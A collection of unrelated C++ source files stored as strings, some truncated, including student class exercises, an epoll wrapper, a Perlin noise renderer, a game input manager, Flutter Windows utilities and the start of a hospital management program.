    "\ufeff// Homework01.04.2024-Classes.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\nusing namespace std;\n\nclass Dog \n{\npublic:\n    string name;\n    string color;\n    string bread;\n    string favorite_food;\n    double weight = 0;\n\n    void Bark()\n    {\n        cout << bread << name << \" : \" <<  \"GAV-GAV...\\n\";\n    }\n    void Growl()\n    {\n        cout << bread << name << \" : \" << \"R-R-R-R-R-R...\\n\";\n    }\n    void Walk()\n    {\n        cout << \" loves to walk in the park,\";\n    }\n    void Eat()\n    {\n        cout << bread << name << \" love eat \" << favorite_food << \".\\n\";\n    }\n    void Sleep()\n    {\n        cout <<  bread << name << \" went to sleep.\\n\";\n    }\n};\n\nclass PowerBank\n{\npublic:\n    string brand;\n    string color;\n    int quantity_ports = 0;\n    double capacity = 0;\n    bool Type_C = false;\n    bool USB = false;\n    bool Micro_USB = false;\n    bool charg = false;\n\n    void Charging()\n    {\n        if ((Type_C || Micro_USB) && !USB && charg)\n        {\n            cout << \"Power bank charge the device.\\n\";\n        }\n        else if (USB)\n        {\n            cout << \"Power bank charging.\\n\";\n        }\n    }\n    void  PowerBankInfo()\n    {\n        cout << \"Power Bank Info:\\n\";\n        cout << \"\\t\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\t\\tColor: \" << color << \"\\n\";\n        cout << \"\\t\\tQuantity USB-ports: \" << quantity_ports << \"\\n\";\n        cout << \"\\t\\tCapacity: \" << capacity << \" mA/h\\n\";\n        if (Type_C)\n        {\n            cout << \"\\t\\tHave Type C-port \\n\";\n        }\n        if (Micro_USB)\n        {\n            cout << \"\\t\\tHave Micro USB-port \\n\";\n        }\n    }\n};\n\nclass Mouse\n{\npublic:\n    string brand;\n    string model;\n    string color;\n    bool wireless = false;\n    bool left_button = false;\n    bool right_button = false;\n    bool scrol = false;\n\n    void Press_left_button()\n    {\n        if (left_button)\n        {\n            cout << \"Perform an action.\\n\";\n        }\n        \n    }\n    void Press_right_button()\n    {\n        if (right_button)\n        {\n            cout << \"Show context menu.\\n\";\n        }\n    }\n    void Scrol()\n    {\n        if (scrol)\n        {\n            cout << \"Scroll....scrol...scrol...scrol...\\n\";\n        }\n    }\n    void MouseInfo()\n    {\n        cout << \"Mouse Info:\\n\";\n        cout << \"\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\tModel: \" << model << \"\\n\";\n        cout << \"\\tColor: \" << color << \"\\n\";\n        if (wireless)\n        {\n            cout << \"\\tWired or wireless:  wireless.\\n\";\n        }\n        else\n        {\n            cout << \"\\tWired or wireless:  wired.\\n\";\n        }\n    }\n};\n\nclass TV\n{\npublic:\n    string brand;\n    string model;\n    double diagonal = 0;\n    string color;\n\n    void TVInfo() \n    {\n        cout << \"TV Info:\\n\";\n        cout << \"\\tBrand: \" << brand << \"\\n\";\n        cout << \"\\tModel: \" << model << \"\\n\";\n        cout << \"\\tDiagonal: \" << diagonal << \" inches\" << \"\\n\";\n        cout << \"\\tColor: \" << color << \"\\n\";\n    }\n    void TV_On() \n    {\n        cout << \"The TV turns on...\\n\";\n    }\n\n    void TV_Off() \n    {\n        cout << \"The TV turns off\\n\";\n    }\n\n    void changeChannel(int channel) \n    {\n        cout << \"Changing channel to \" << channel << \"\\n\";\n    }\n\n};\n\nclass Automobile\n{\npublic: \n    string brand;\n    string model;\n    string equipment;\n    string engine_type;\n    double engine_volume = 0;\n    string fuel;\n    string transmision;\n    double power = 0;\n    int wheel_drive = 0;\n\n    void CarInfo()\n    {\n        cout << \"Car Information:\\n\";\n        cout << \"\\t\\tCar brand: \" << brand << \"\\n\";\n        cout << \"\\t\\tModel: \" << model << \"\\n\";\n        cout << \"\\t\\tCar equipment: \" << equipment << \"\\n\";\n        cout << \"\\t\\tEngine type: \" << engine_type << \"\\n\";\n        cout << \"\\t\\tEngine volume: \" << engine_volume << \" sm3\\n\";\n        cout << \"\\t\\tFuel: \" << fuel << \"\\n\";\n        cout << \"\\t\\tTransmision: \" << transmision << \"\\n\";\n        cout << \"\\t\\tEngine power: \" << power << \" hp\\n\";\n        cout << \"\\t\\tWheel drive: \" << wheel_drive << \" wheels\\n\";\n    }\n\n};\n\nclass Sosed\n{\npublic:\n    string name;\n    string shoes;\n    string tool;\n    bool sleeping = false;\n    string mental_condition;\n\n    void Never_sleep()\n    {\n        cout << \"A-HA-HA!!! NO, NO, NO\\n\";\n    }\n    void About_myself()\n    {\n        cout << \"My name is \" << name << \", i am a \" << mental_condition << \" And i have a \" << tool << \"\\n\";\n    }\n    void Work()\n    {\n        cout << \"I'll put my on now \" << shoes << \" and take my \" << tool << \"\\n\";\n        cout << \"I urgently need to do something. NOW!\\n\";\n    }\n};\n\nint main()\n{\n  //////////////////////////////////////////////////////////////////////////                  DOG                    ///////////////////////////////////////////////////////////////// \n    Dog dog;\n\n    dog.name = \"Benya\";\n    dog.favorite_food = \"meat\";\n    dog.bread = \"Pikines \";\n    dog.weight = 6;\n    dog.color = \"beige\";\n    \n    cout << dog.name",
    "#include \"Epoller.h\"\n\nEpoller::Epoller(int maxEvent) : epollFd_(epoll_create(512)), events_(maxEvent) {\n    assert(epollFd_ >= 0 && events_.size() > 0);\n}\n\nEpoller::~Epoller() {\n    close(epollFd_);\n}\n\nbool Epoller::AddFd(int fd, uint32_t events) {\n    if (fd < 0) return false;\n    epoll_event ev = {0};\n    ev.data.fd = fd;\n    ev.events = events;\n    return 0 == epoll_ctl(epollFd_, EPOLL_CTL_ADD, fd, &ev);\n}\n\nbool Epoller::ModFd(int fd, uint32_t events) {\n    if (fd < 0) return false;\n    epoll_event ev = {0};\n    ev.data.fd = fd;\n    ev.events = events;\n    return 0 == epoll_ctl(epollFd_, EPOLL_CTL_MOD, fd, &ev);\n}\n\nbool Epoller::DelFd(int fd) {\n    if (fd < 0) return false;\n    return 0 == epoll_ctl(epollFd_, EPOLL_CTL_DEL, fd, nullptr);\n}\n\nint Epoller::Wait(int timeoutMs) {\n    return epoll_wait(epollFd_, &events_[0], static_cast<int>(events_.size()), timeoutMs);\n}\n\nint Epoller::GetEventFd(size_t i) const {\n    assert(i < events_.size() && i >= 0);\n    return events_[i].data.fd;\n}\n\nuint32_t Epoller::GetEvents(size_t i) const {\n    assert(i < events_.size() && i >= 0);\n    return events_[i].events;\n}\n\n\n",
    "\n#include <iostream>\n#include <map>\n#include <string>\n#include <vector>\n#include <random>\n#include <set>\n#include <fstream>\n#include <sstream>\n#include <algorithm>\n\nusing namespace std;\n\nstruct Pair {\n\tstring word;\n\tstring previous;\n\tstring next;\n\tint position = 0;\n};\n\nstruct WordSet {\n\tstring word;\n\tvector<string> next;\n\tvector<string> previous;\n\tbool is_unique = false;\n};\n\nvector<string> split(const string& text)\n{\n\tvector<string> output;\n\tstring temp = \"\";\n\n\tfor (char c : text) {\n\t\tif (c == ' ') {\n\t\t\toutput.push_back(temp);\n\t\t\ttemp = \"\";\n\t\t}\n\t\telse {\n\t\t\ttemp += c;\n\t\t}\n\t}\n\n\tif (!temp.empty()) {\n\t\toutput.push_back(temp);\n\t}\n\n\treturn output;\n\n}\n\nvector<Pair> find_seed(const vector<string>& words) {\n\tmap<string, int> word_count;\n\tmap<string, int> word_positions;\n\n\t// Count each word and remember the first position\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tword_count[words[i]]++;\n\t\t// Only record the position the first time the word is encountered\n\t\tif (word_count[words[i]] == 1) {\n\t\t\tword_positions[words[i]] = i;\n\t\t}\n\t}\n\n\tvector<Pair> seed;\n\n\t/* Now add to the seed only those words with a count of 1 */\n\tfor (const auto& wc : word_count) {\n\t\tif (wc.second == 1) {\n\t\t\tseed.push_back({ wc.first, \"\", \"\", word_positions[wc.first]});\n\t\t}\n\t}\n\n\treturn seed;\n}\n\nint get_word_index(const string& word, vector<Pair>& words)\n{\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i].word == word) {\n\t\t\treturn i;\n\t\t}\n\t}\n\n\treturn -1;\n\n}\n\nvector<int> get_instances_of_word(string& word, vector<string>& words)\n{\n\tvector<int> output;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i] == word) {\n\t\t\toutput.push_back(i);\n\t\t}\n\t}\n\n\treturn output;\n\n}\n\nstd::map<std::string, WordSet> rule_set(vector<string>& words, vector<Pair>& seed) {\n\tstd::map<std::string, WordSet> rules;\n\n\tfor (const auto& word : words) {\n\t\tauto& ws = rules[word]; // This ensures a WordSet is created for each word, even if it's not in the seed.\n\t}\n\n\t// Process seed words\n\tfor (const auto& s : seed) {\n\t\trules[s.word].is_unique = true;\n\t}\n\n\t// Construct rules based on words vector\n\tfor (size_t i = 0; i < words.size(); ++i) {\n\t\tstring& word = words[i];\n\t\tif (i > 0) {\n\t\t\t// Add the previous word if not the first word\n\t\t\trules[word].previous.push_back(words[i - 1]);\n\t\t}\n\t\tif (i < words.size() - 1) {\n\t\t\t// Add the next word if not the last word\n\t\t\trules[word].next.push_back(words[i + 1]);\n\t\t}\n\t}\n\n\t// Remove duplicates from previous and next vectors\n\tfor (auto& rule : rules) {\n\t\tauto& ws = rule.second;\n\t\tstd::sort(ws.previous.begin(), ws.previous.end());\n\t\tws.previous.erase(std::unique(ws.previous.begin(), ws.previous.end()), ws.previous.end());\n\n\t\tstd::sort(ws.next.begin(), ws.next.end());\n\t\tws.next.erase(std::unique(ws.next.begin(), ws.next.end()), ws.next.end());\n\t}\n\n\treturn rules;\n}\n\nvoid initialize_array(std::vector<std::string>& arr, int size) {\n\tarr.resize(size);\n\tfor (int i = 0; i < size; ++i) {\n\t\tarr[i] = \"_____\";\n\t}\n}\n\nbool vec_contains_str(vector<string>& words, string& word)\n{\n\tfor (string s : words) {\n\t\tif (s == word) { return true; }\n\t}\n\treturn false;\n}\n\nint get_combinations(string& left, string& right, std::map<std::string, WordSet>& rule_set)\n{\n\tvector<string> combos;\n\tif (left != \"_____\") {\n\t\tcombos = rule_set[left].next;\n\t}\n\t\n\tif (right != \"_____\") {\n\t\tif (combos.empty()) {\n\t\t\tcombos = rule_set[right].previous;\n\t\t}\n\t\telse {\n\t\t\tfor (string s : rule_set[right].previous) {\n\t\t\t\tif (!vec_contains_str(combos, s)) { combos.push_back(s); }\n\t\t\t}\n\t\t}\n\t}\n\n\treturn (combos.empty() ? INT_MAX : combos.size());\n}\n\n/* \nindex: index is the position in the vector<string> we are trying to solve\nwords: the array we are trying to solve\nrule_set: the rules of given words\n*/\nint number_of_combinations(int index, vector<string>& words, std::map<std::string, WordSet>& rule_set) {\n\tint num_combos = 0;\n\tstring prev_word = \"_____\";\n\tstring next_word = \"_____\";\n\t/* Check if we can get the previous word */\n\tif (index - 1 >= 0) {\n\t\t/* Get all words this word could be */\n\t\tprev_word = words[index - 1];\n\t}\n\n\tif (index + 1 < words.size()) {\n\t\tnext_word = words[index + 1];\n\t}\n\n\treturn get_combinations(prev_word, next_word, rule_set);\n\n}\n\n\nvector<int> all_entropy(vector<string>& words, std::map<std::string, WordSet>& rule_set)\n{\n\tvector<int> output;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\toutput.push_back(number_of_combinations(i, words, rule_set));\n\t}\n\n\treturn output;\n}\n\nint find_least_combos(vector<string>& words, std::map<std::string, WordSet>& rule_set)\n{\n\tint lowest_combo = INT_MAX;\n\tint index = -1;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i] != \"_____\") {\n\t\t\tcontinue;\n\t\t}\n\n\t\tint value = number_of_combinations(i, words, rule_set);\n\t\tif (value < lowest_combo) {\n\t\t\tlowest_combo = value;\n\t\t\tindex = i;\n\t\t}\n\t}\n\n\treturn index;\n\n}\n\nstring vector_to_string(vector<string>& words)\n{\n\tstring output;\n\n\tfor (string s : words) {\n\t\toutput += s + \" \";\n\t}\n\n\treturn output;\n\n}\n\nvoid fill_least_entropy_position(vector<string>& words, std::map<std::string, WordSet>& rule_set, std:",
    "#include \"InputManager.h\"\n\nvoid InputManager::Init(HWND hwnd)\n{\n\tmHwnd = hwnd;\n\tfor (int i = 0; i < 255; i++)\n\t{\n\t\tmKey[i] = KeyState::None;\n\t}\n}\n\nvoid InputManager::Update()\n{\n\tmIsKeyDown = false;\n\tmIsKey = false;\n\tmIsKeyUp = false;\n\n\tfor (int i = 0; i < 255; i++)\n\t{\n\t\t/// \uc774\ubc88 \ud504\ub808\uc784\uc5d0 \ud0a4 \ub204\ub984\n\t\t// \uc774\uc804 \ud504\ub808\uc784\uc5d0 None or Up \uc774\uc5c8\ub294\ub370 \ub20c\ub838\ub2e4. -> Down\n\t\tif ((mKey[i] == KeyState::None || mKey[i] == KeyState::Up)\n\t\t\t&& GetAsyncKeyState(i) & 0x8000)\n\t\t{\n\t\t\tmKey[i] = KeyState::Down;\n\t\t\tmIsKeyDown = true;\n\t\t}\n\t\t// \uc774\uc804 \ud504\ub808\uc784\uc5d0 Down \uc774\uc5c8\ub294\ub370 \ub20c\ub838\ub2e4. -> Press\n\t\telse if (mKey[i] == KeyState::Down && GetAsyncKeyState(i) & 0x8000)\n\t\t{\n\t\t\tmKey[i] = KeyState::Press;\n\t\t\tmIsKey = true;\n\t\t}\n\n\t\t/// \uc774\ubc88 \ud504\ub808\uc784\uc5d0 \ud0a4 \uc548 \ub204\ub984\n\t\t// \uc774\uc804 \ud504\ub808\uc784\uc5d0 Down, Press \uc774\uc5c8\ub294\ub370 \uc548\ub20c\ub800\ub2e4. -> Up\n\t\telse if ((mKey[i] == KeyState::Down || mKey[i] == KeyState::Press)\n\t\t\t&& !(GetAsyncKeyState(i) & 0x8000))\n\t\t{\n\t\t\tmKey[i] = KeyState::Up;\n\t\t\tmIsKeyUp = true;\n\t\t}\n\t\t// \uc774\uc804 \ud504\ub808\uc784\uc5d0 Up \uc774\uc5c8\ub294\ub370 \uc548\ub20c\ub800\ub2e4.\n\t\telse if (mKey[i] == KeyState::Up && !(GetAsyncKeyState(i) & 0x8000))\n\t\t{\n\t\t\tmKey[i] = KeyState::None;\n\t\t}\n\t}\n\n\tmPreMousePosition = mMousePosition;\n\tmMousePosition = GetMousePosition();\n}\n\nPOINT InputManager::GetMousePosition()\n{\n\tPOINT mousePos;\n\tGetCursorPos(&mousePos);\n\tScreenToClient(mHwnd, &mousePos);\n\n\treturn mousePos;\n}\n\nPOINT InputManager::GetDeltaPosition()\n{\n\treturn { mMousePosition.x - mPreMousePosition.x,  mMousePosition.y - mPreMousePosition.y };\n}\n",
    "#include <bits/stdc++.h>\r\n#include <ext/pb_ds/assoc_container.hpp>\r\n#include <ext/pb_ds/tree_policy.hpp>\r\n\r\nusing namespace std;\r\nusing namespace __gnu_pbds;\r\n\r\n#define ull unsigned long long int\r\n#define ld long double\r\n#define ll long long\r\n#define PI acos(-1)\r\n#define endl \"\\n\"\r\n#define all(x) x.begin(), x.end()\r\n#define fixed(n) cout << fixed << setprecision(n)\r\n#define loop(i, n) for (int i = 0; i < (int)n; i++)\r\n\r\nconst int OO = 0x3f3f3f3f;\r\nconst int N = 1e5 + 7;\r\nint dx[] = {1, -1, 0, 0};\r\nint dy[] = {0, 0, 1, -1};\r\n\r\nvoid Ahmed_Faraj()\r\n{\r\n    ios_base::sync_with_stdio(false);\r\n    cin.tie(nullptr);\r\n    cout.tie(nullptr);\r\n#ifndef ONLINE_JUDGE\r\n    freopen(\"input.txt\", \"r\", stdin);\r\n    freopen(\"output.txt\", \"w\", stdout);\r\n#endif\r\n}\r\n\r\nvoid solve()\r\n{\r\n    ll n, cnt = 0;\r\n    cin >> n;\r\n    ll arr[n];\r\n    for (size_t i = 0; i < n; i++)\r\n    {\r\n        cin >> arr[i];\r\n    }\r\n    \r\n    sort(arr, arr + n);\r\n    for (size_t i = 0; i < n - 2; i++)\r\n    {\r\n        for (size_t j = i + 1; j < n - 1; j++)\r\n        {\r\n            ll l = j + 1, r = n - 1;\r\n            ll ans = -1, mid;\r\n            while (l <= r)\r\n            {\r\n                mid = l + (r - l) / 2;\r\n                if ((arr[mid] + arr[i] > arr[j]) &&\r\n                    (arr[mid] + arr[j] > arr[i])&&\r\n                    (arr[i] + arr[j] > arr[mid]))\r\n                {\r\n                    // cout << mid << \" \" ;\r\n                    ans = mid;\r\n                    l = mid + 1;\r\n                }\r\n                else\r\n                {\r\n                    r = mid - 1;\r\n                }\r\n            }\r\n            if (ans != -1)\r\n            {\r\n                cnt += ans - j;\r\n            }\r\n            // cout << ans << \" \" << i << \" \" << j << \" \" << mid << endl;\r\n        }\r\n    }\r\n    cout << cnt;\r\n}\r\n\r\nsigned main()\r\n{\r\n    Ahmed_Faraj();\r\n    // fast();\r\n    ll test = 1;\r\n    // cin >> test;\r\n    while (test--)\r\n    {\r\n        solve();\r\n    }\r\n    return 0;\r\n}",
    "#define _USE_MATH_DEFINES\n#include <SFML/Graphics.hpp>\n#include <cmath>\n#include <vector>\n#include <algorithm>\n#include <random>\n#include <iostream>\n\nusing namespace std;\n\nclass Vector2 {\npublic:\n    float x, y;\n\n    Vector2(float _x, float _y) : x(_x), y(_y) {}\n\n    float dot(const Vector2& other) const {\n        return x * other.x + y * other.y;\n    }\n};\n\n// Fisher-Yates \uc54c\uace0\ub9ac\uc998.\nvoid Shuffle(std::vector<int>& arrayToShuffle) {\n    std::random_device rd;\n    std::mt19937 g(rd());\n\n    for (int e = arrayToShuffle.size() - 1; e > 0; e--) {\n        std::uniform_int_distribution<int> distribution(0, e - 1);\n        int index = distribution(g);\n\n        std::swap(arrayToShuffle[e], arrayToShuffle[index]);\n    }\n}\n\n// \ubbf8\ub9ac \ub9cc\ub4e0 \uc218\uc5f4\uc744 \uc0ac\uc6a9\ud55c\ub2e4. 0 - \nstd::vector<int> MakePermutation() {\n    std::vector<int> permutation;\n    for (int i = 0; i < 256; i++) {\n        permutation.push_back(i);\n    }\n\n    Shuffle(permutation);\n\n    for (int i = 0; i < 256; i++) {\n        permutation.push_back(permutation[i]);\n    }\n\n    return permutation;\n}\n\nconst std::vector<int> Permutation = MakePermutation();\n\nVector2 GetGradientVector(int v) {\n    int h = v & 3;\n    if (h == 0)\n        return Vector2(1.0f, 1.0f);\n    else if (h == 1)\n        return Vector2(-1.0f, 1.0f);\n    else if (h == 2)\n        return Vector2(-1.0f, -1.0f);\n    else\n        return Vector2(1.0f, -1.0f);\n}\n\nfloat Fade(float t) {\n    return ((6 * t - 15) * t + 10) * t * t * t;\n}\n\nfloat Lerp(float t, float a1, float a2) {\n    return a1 + t * (a2 - a1);\n}\n\nfloat Noise2D(float x, float y) {\n    // 1. \uac01 x, y \uc2e4\uc218\ub97c \uc785\ub825\uc73c\ub85c \ub450\uc5c8\uc744 \ub54c, \ud53d\uc140\ub4e4\uc740 \uc815\uc218 \uadf8\ub9ac\ub4dc\uc5d0 \uc874\uc7ac\ud569\ub2c8\ub2e4.\n\n    int X = static_cast<int>(std::floor(x)) & 255;\n    int Y = static_cast<int>(std::floor(y)) & 255;\n\n    // 1. \uc18c\uc218\ubd80\ub9cc \ub0a8\uae30\uac8c \ud569\ub2c8\ub2e4.\n    float xf = x - std::floor(x);\n    float yf = y - std::floor(y);\n\n    // 2. \ud574\ub2f9 \uc815\uc0ac\uac01\ud615 \uadf8\ub9ac\ub4dc \uac01 \uaf2d\uc9d3\uc810\uc5d0 \uadf8\ub798\ub514\uc5b8\ud2b8(\uae30\uc6b8\uae30) \ubca1\ud130\ub97c \ud560\ub2f9\ud569\ub2c8\ub2e4.\n    // 2-1. Ken Perlin \uc774 \uc81c\uc548\ud55c \uc21c\uc5f4\uc774 \uc874\uc7ac\ud569\ub2c8\ub2e4.\n    // 2-2. \uc21c\uc5f4\uc5d0\uc11c \uac12\uc744 \uac00\uc838\uc635\ub2c8\ub2e4. \uac01 \ubaa8\uc11c\ub9ac\ub4e4\uc5d0\uac8c \uc21c\uc5f4\uc758 \uac12\uc744 \ud560\ub2f9\ud569\ub2c8\ub2e4.\n    int valueTopRight = Permutation[Permutation[X + 1] + Y + 1];\n    int valueTopLeft = Permutation[Permutation[X] + Y + 1];\n    int valueBottomRight = Permutation[Permutation[X + 1] + Y];\n    int valueBottomLeft = Permutation[Permutation[X] + Y];\n\n    // 3. \uac01 \ubaa8\uc11c\ub9ac\uc810\uc5d0\uc11c \uc785\ub825 \uc810\uae4c\uc9c0\uc758 \uac70\ub9ac \ubca1\ud130\ub97c \uad6c\ud569\ub2c8\ub2e4.\n    Vector2 topRight(xf - 1.0f, yf - 1.0f);\n    Vector2 topLeft(xf, yf - 1.0f);\n    Vector2 bottomRight(xf - 1.0f, yf);\n    Vector2 bottomLeft(xf, yf);\n\n    // 4. \uac01 \ubaa8\uc11c\ub9ac \uc810\uc758 \uc624\ud504\uc14b \ubca1\ud130(\uc785\ub825 \uc810\uae4c\uc9c0\uc758 \uac70\ub9ac \ubca1\ud130) \uacfc \ubaa8\uc11c\ub9ac \uc810\uc758 \uae30\uc6b8\uae30\ub97c \ub0b4\uc801\ud569\ub2c8\ub2e4. \uadf8\ub798\ub514\uc5b8\ud2b8 \ubca1\ud130\uc758 \uc601\ud5a5\ub825\uc740 \uac70\ub9ac\uc5d0 \ub530\ub77c \ucee4\uc9d1\ub2c8\ub2e4.\n    float dotTopRight = topRight.dot(GetGradientVector(valueTopRight));\n    float dotTopLeft = topLeft.dot(GetGradientVector(valueTopLeft));\n    float dotBottomRight = bottomRight.dot(GetGradientVector(valueBottomRight));\n    float dotBottomLeft = bottomLeft.dot(GetGradientVector(valueBottomLeft));\n\n    // 5. \ubd80\ub4dc\ub7ec\uc6b4 \ubcf4\uac04(smooth interpolation)\uc744 \uc704\ud574 \uc0ac\uc6a9\ub429\ub2c8\ub2e4. \n    // \uc774 \ud568\uc218\ub294 \uc785\ub825 \uac12 t\ub97c 0\uc5d0\uc11c 1 \uc0ac\uc774\uc758 \uac12\uc73c\ub85c \ub9e4\ud551\ud558\uba70, \ub2e4\ud56d\uc2dd \uace1\uc120\uc744 \ub530\ub77c \ubcc0\ud654\ud569\ub2c8\ub2e4.\n    float u = Fade(xf);\n    float v = Fade(yf);\n\n    // 6. \ub0b4\uc801\ud55c \uac12\ub4e4\uc744 \ud63c\ud569\ud558\uc5ec \ub2e8\uc77c\uc758 \uac12\uc73c\ub85c \ub9cc\ub4ed\ub2c8\ub2e4. \n    float result = Lerp(v,\n        Lerp(u, dotBottomLeft, dotBottomRight), Lerp(u, dotTopLeft, dotTopRight));\n\n    return result;\n}\n\nfloat FractalBrownianMotion(float x, float y, int numOctaves) {\n    float result = 0.0f;\n    float amplitude = 1.0f;\n    float frequency = 0.005f;\n    float persistence = 0.5f;\n\n    for (int octave = 0; octave < numOctaves; octave++) {\n        float n = amplitude * Noise2D(x * frequency, y * frequency);\n        result += n;\n\n        amplitude *= persistence; \n        frequency *= 2.0f;\n    }\n\n    result = std::max(-1.0f, std::min(1.0f, result));\n\n    return result;\n}\n\nint main() {\n    const int windowWidth = 800;\n    const int windowHeight = 600;\n    const int numOctaves = 8;\n\n    sf::RenderWindow window(sf::VideoMode(windowWidth, windowHeight), \"Perlin Noise\");\n\n    sf::Image textureImage;\n    textureImage.create(windowWidth, windowHeight);\n\n    for (int y = 0; y < windowHeight; y++) {\n        for (int x = 0; x < windowWidth; x++) {\n            float persistence = 0.5f;\n            float frequency = 0.01f;\n            //float n = Noise2D(x * frequency, y * frequency);\n            //float value = n;\n            float value = FractalBrownianMotion(static_cast<float>(x), static_cast<float>(y), numOctaves);\n            value = (value + 1.0f) / 2.0f; // Normalize to [0, 1]\n\n            sf::Color color(static_cast<sf::Uint8>(255 * value), static_cast<sf::Uint8>(255 * value), static_cast<sf::Uint8>(255 * value));\n            textureImage.setPixel(x, y, color);\n        }\n    }\n\n    sf::Texture texture;\n    texture.loadFromImage(textureImage);\n    sf::Sprite sprite(texture);\n\n    while (window.isOpen()) {\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        window.clear();\n        window.draw(sprite);\n        window.display();\n    }\n\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include<fstream>\r\n#include <string>\r\n#include <conio.h>\r\n#include <windows.h>\r\n#include <ctime>\r\n#include<cctype>\r\n#include<limits>\r\nusing namespace std;\r\n//functions prototype starts\r\nvoid topheading();\r\nvoid header();\r\nvoid delay(int milliseconds);\r\nvoid showLoadingAnimation();\r\nvoid gotoxy(int x, int y);\r\nvoid multaninterface();\r\nvoid islamabadinterface();\r\nvoid lahoreinterface();\r\nstring login();\r\nvoid thankyou();\r\nvoid clear();\r\nvoid hideCursor();\r\nstring adminmenu();\r\nint check_integer(string num);\r\nvoid prescription();\r\nvoid addpatient(int &addpatientindex, string patientname[], string patientage[], string patientcnic[], string patientbloodgroup[], string patienthistory[], string visitdatepatient[], string patientphonenumber[], string filenameaddpatient);\r\nvoid dischargepatient(string dischargepatientcnic, int addpatientindex, string patientcnic[], string patientname[], string patientage[], string patientbloodgroup[], string patienthistory[], string patientphonenumber[], string visitdatepatient[], string filenameaddpatient);\r\nvoid viewpatient(int &addpatientindex, string patientname[], string patientage[], string patientcnic[], string patientbloodgroup[], string patienthistory[], string visibledatepatient[], string patientphonenumber[]);\r\nvoid changingsalary(string doctorsalary, string managersalary, string filenamecahngingsalary);\r\nvoid profitloss(string patientcharges, int addpatientindex, string filenameprofitloss);\r\nvoid addbed(string bedadd, string filenameaddbed);\r\nvoid adddoctor(string doctorname[], string doctorspeciality[], int &adddoctorindex, string filenameadddoctor);\r\nvoid viewdoctor(string doctorname[], string doctorspeciality[],string 